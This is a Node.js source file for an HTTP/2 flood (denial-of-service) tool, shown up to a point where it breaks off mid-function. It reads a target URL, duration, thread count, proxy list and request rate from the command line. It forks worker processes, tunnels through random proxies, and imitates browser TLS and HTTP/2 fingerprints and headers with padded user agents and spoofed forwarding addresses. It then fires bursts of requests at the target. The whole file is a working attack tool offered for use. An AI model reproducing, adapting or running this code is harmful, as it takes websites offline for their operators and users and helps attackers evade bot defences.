const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();






const errorHandler = error => {
//console.log(error)
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    console.error('Error proxy file:', err.message);
    process.exit(1);
}
const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
let randbyte = 1
setInterval(()=>{
 randbyte = Math.floor(Math.random() * 5) + 1;
},5000)
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 100;
if (cluster.isMaster) {
  console.log("@CRISXTOP");
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr().split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
   const DAY = ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"];
const DAY1 = getRandomInt(1,30);
const month = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

var day = DAY[Math.floor(Math.floor(Math.random() * DAY.length))];
var day1 = month[Math.floor(Math.floor(Math.random() * month.length))];

const hell = day+ " " + DAY1 + " " + day1;

    const type = [
    "text/plain"
    , "text/html"
    , "application/json"
    , "application/xml"
    , "multipart/form-data"
    , "application/octet-stream"
    , "image/jpeg"
    , "image/png"
    , "audio/mpeg"
    , "video/mp4"
    , "application/javascript"
    , "application/pdf"
    , "application/vnd.ms-excel"
    , "application/vnd.ms-powerpoint"
    , "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    , "application/vnd.openxmlformats-officedocument.presentationml.presentation"
    , "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    , "application/zip"
    , "image/gif"
    , "image/bmp"
    , "image/tiff"
    , "audio/wav"
    , "audio/midi"
    , "video/avi"
    , "video/mpeg"
    , "video/quicktime"
    , "text/csv"
    , "text/xml"
    , "text/css"
    , "text/javascript"
    , "application/graphql"
    , "application/x-www-form-urlencoded"
    , "application/vnd.api+json"
    , "application/ld+json"
    , "application/x-pkcs12"
    , "application/x-pkcs7-certificates"
    , "application/x-pkcs7-certreqresp"
    , "application/x-pem-file"
    , "application/x-x509-ca-cert"
    , "application/x-x509-user-cert"
    , "application/x-x509-server-cert"
    , "application/x-bzip"
    , "application/x-gzip"
    , "application/x-7z-compressed"
    , "application/x-rar-compressed"
    , "application/x-shockwave-flash"
  ];

const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
    'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib',
    'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma',
    'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma',
    'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz',
    'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib',
    'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib',
    'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz',
    'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz',
    'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib',
    'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib',
    'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma',
    'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4',
    'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib',
    'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib',
    'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib',
    'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz',
    'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz',
    'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib',
    'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz',
    'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib',
    'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib',
    'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma',
    'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma',
    'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz',
    'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma',
    'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib',
    'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib',
    'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma',
    'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib',
    'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib',
    'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz',
    'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib',
    'lz4, lzma, xz, zlib'
];
const method = [
"GET",
"POST",
"PUT",
"PATCH",
"DELETE",
"OPTIONS",
"HEAD",
"CONNECTION",
"COPY",
"MKACTIVITY",
"SEARCH",
"MERGE",
"MOVE",
"SUBSCRIBE",
"UNSUBSCRIBE",
"REPORT",
"PROPPATCH",
"PROPFIND",
"MKCOL",
"ACL",
"UPDATE",
"UNLOCK",
"LOCK",
];

const mmb  = method[Math.floor(Math.floor(Math.random() * method.length))];

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 86, max: 134 },
        safari: { min: 14, max: 16 },
        brave: { min: 86, max: 134 },
        firefox: { min: 85, max: 118 },
        mobile: { min: 78, max: 134 },
        opera: { min: 90, max: 130 },
        operagx: { min: 70, max: 135 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
   

    
    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux"
    };
    const platform = platforms[browser];

    const userAgent = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        mobile: `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`
    };

 const headersMap = {
        brave: {
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua": `Brave";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.brave,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        chrome: {

    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.chrome,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        firefox: {
    "sec-ch-ua": `"Firefox";v="${version}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.firefox,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        safari: {
        "sec-ch-ua": `"Safari";v="${version}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.safari,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        mobile: {
    "sec-ch-ua": `"Chromium";v="${version}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.mobile,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        opera: {
    "sec-ch-ua": `"Opera";v="${version}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua": `\"Not/A)Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.opera,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
},
        operagx: {   
    "sec-ch-ua": `"Opera GX";v="${version}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "age": getRandomInt(4000,10000),
        "expires" : day + DAY1 + day1,
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-user": "?1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'user-agent': userAgent.operagx,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
        "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
        "priority": `u=${randbyte}, i`,
         "x-forwarded-for" : proxy[0],
        "sec-fetch-site": "none",
}
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
const agent = new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            timeout: 5000,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
                'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            },
        };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
 
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);

    

    let hpack = new HPACK();
    


    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: h2settings,
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 1000,
    "maxSessionMemory": 100,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    const frames = [
Buffer.from(PREFACE, 'binary'),
encodeFrame(0, 4, encodeSettings([
[1, 65535],
[2, 0],
[4, 6291456],
[6, 262144],
])),
encodeFrame(0, 8, updateWindow)
];
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            let count = 0;
            let threadvalue = 0;
            
                
let author = {
                            "method" : "GET",
                            ":authority": parsed.host,
                            ":scheme": "https",
                            ":path": parsed.path,
                           
                        };

                const head = {
                    ...author,
                    ...headers,
                };
                
                            
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < rps; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve();
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

